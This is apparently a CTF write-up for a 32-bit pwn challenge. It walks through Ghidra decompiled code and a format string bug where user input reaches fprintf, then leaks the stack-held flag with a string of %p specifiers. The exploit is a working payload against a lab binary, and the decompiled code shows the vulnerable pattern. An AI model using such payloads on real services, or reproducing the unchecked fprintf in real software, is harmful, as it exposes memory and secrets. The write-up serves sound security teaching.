---
title:  "[CTF] Unauthorised Access"
categories: [CTF, HTB, Pwn]
---

<blockquote>
  <p>Our security developer stated that switching to a 64-bit architecture is unnecessary since their program ensures safety, and only the admin with the authorization cookie can access the secret file. However, we remain uncertain and would appreciate it if you could investigate this matter further.</p></blockquote>

## Understanding the challenge

When running the binary, we have a few tempting options, like reading the secret message or logging in as admin, which of course don’t work:

![Menu](/assets/images/Unauthorised/menu.png)


Behind the scenes, the main function simply calls  a few helper functions to setup the challenge and display the menu:

```c
undefined4 main(void)

{
  int iVar1;
  undefined4 uVar2;
  int in_GS_OFFSET;
  
  iVar1 = *(int *)(in_GS_OFFSET + 0x14);
  setup();
  banner();
  menu();
  uVar2 = 0;
  if (iVar1 != *(int *)(in_GS_OFFSET + 0x14)) {
    uVar2 = __stack_chk_fail_local();
  }
  return uVar2;
}
```


The interesting bits happen in the `menu()` function (annotated code with comments and variable names changed, obtained from Ghidra decompile tool):

```c
void menu(void)
{
  int fdFlag;
  int in_GS_OFFSET;
  byte bVar1;
  undefined4 contentFlag [20];
  undefined4 msgToAdmin [64];
  undefined4 local_10;
  undefined4 *ptrStr;
  
  bVar1 = 0;
  local_10 = *(undefined4 *)(in_GS_OFFSET + 0x14);
  while( true ) {
    // Zero out
    ptrStr = msgToAdmin;
    for (fdFlag = 0x40; fdFlag != 0; fdFlag = fdFlag + -1) {
      *ptrStr = 0;
      ptrStr = ptrStr + (uint)bVar1 * -2 + 1;
    }
    ptrStr = contentFlag;
    for (fdFlag = 0x14; fdFlag != 0; fdFlag = fdFlag + -1) {
      *ptrStr = 0;
      ptrStr = ptrStr + (uint)bVar1 * -2 + 1;
    }
   fdFlag = open("./flag.txt",0);
    if (fdFlag < 0) break;
 read(fdFlag,contentFlag,0x50);
    fwrite("\n+--------------------------+\n|  1. Read secret message  |\n|  2. Login as admin        |\n|  3. List directory       |\n|  4. Exit                 |\n+--------------------------+\n\n $ "
           ,1,0xb2,stdout);
    fdFlag = read_num();
    if (fdFlag == 2) {
      fprintf(stdout,"%s\n[-] Auth token does not match with admin\'s. Login failed!\n%s",
              &DAT_00010fe8,&DAT_00010e72);
    }
    else if (fdFlag == 3) {
      puts("");
      system("ls");
    }
    else {
      if (fdFlag != 1) {
        fwrite("\nGoodbye!\n",1,10,stdout);
        exit(0x16);
      }
      fprintf(stdout,"%s\n[-] You are not admin!\n%s",&DAT_00010fe8,&DAT_00010e72);
      fwrite("\nYou can leave a message for admin to check it later: ",1,0x36,stdout);
 read(0,msgToAdmin,0x99);
 fwrite("\nYour message is: ",1,0x12,stdout);
 fprintf(stdout,(char *)msgToAdmin);
    }
  }
  perror("\nError opening flag.txt, please contact an Administrator.\n");

  exit(1);
}
```

## Vulnerability identification

Since we’re reading a message from the user and then printing it back as a string, we have a classic case of a format string vulnerability:

```c
read(0, msgToAdmin, 0x99);
fwrite("\nYour message is: ", 1, 0x12, stdout);
fprintf(stdout, (char *)msgToAdmin);
```

## Exploitation

Since we know that the flag is read on a variable stored on the stack, we can use the format string attack to print all the bytes of the message/flag, as hex pointers:


```bash
You can leave a message for admin to check it later: %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p   
                                                          
Your message is: 0x12 0xf7e1dda0 0x1 0x1 0x3 0x7b425448 0x336b3466 0x346c665f 0x5f345f67 0x74353374 0x7d676e31 0xa (nil) (nil) (nil) (nil) (nil) (nil)  

```

## References

* [Lecture Notes (Syracuse University) - Format String Vulnerability](https://web.ecs.syr.edu/~wedu/Teaching/cis643/LectureNotes_New/Format_String.pdf)
* [OWASP - Format String Attack](https://owasp.org/www-community/attacks/Format_string_attack)
